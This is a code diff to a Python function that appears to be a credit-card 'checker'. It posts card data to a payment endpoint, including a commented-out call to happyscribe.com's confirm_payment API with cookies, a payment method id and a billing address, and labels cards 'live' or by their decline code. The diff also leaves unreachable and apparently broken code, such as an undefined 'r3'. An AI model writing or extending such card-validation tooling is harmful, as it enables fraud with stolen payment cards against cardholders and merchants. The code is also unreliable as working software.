@@ -84,21 +84,6 @@ def st(ccx):
 	    headers=headers,
 	    data=data,
 	)
-	print(response.json()['message'])
-	time.sleep(15)
-	try:
-		ii=response
-	except:
-	    return 'success'
-	return ii #Smoke #Smoke #Smoke #Smoke #Smoke #Smoke #Smoke #Smoke #Smoke #Smoke 
-	try:
-		ii=(response.json()['error'][0]['declinecode'])
-		return ii
-	except:
-			return 'live'
-			
-		
-		
 	
 
 # Note: json_data will not be serialized by requests
@@ -106,7 +91,7 @@ def st(ccx):
 #data = '{"id":10486458,"address":"9350 N Central Expy","name":"yusuf","country":"US","vat":null,"billing_account_id":10486458,"last4":"9305","orderReference":"nljannd","user_id":11296645,"organization_id":10807386,"hours":0,"balance_increase_in_cents":null,"payment_method_id":"pm_1PLSN5KEzvleW5flaDzdyat6","transcription_id":null,"plan":"pro_2023_05_01","order_id":null,"recurrence_interval":"month","extra_plan_hours":null}'
 #response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, data=data)
 	
-	text = response.text
+	text = r3
 		
 	pattern = r'Status code (.*?)\s*</li>'
 		
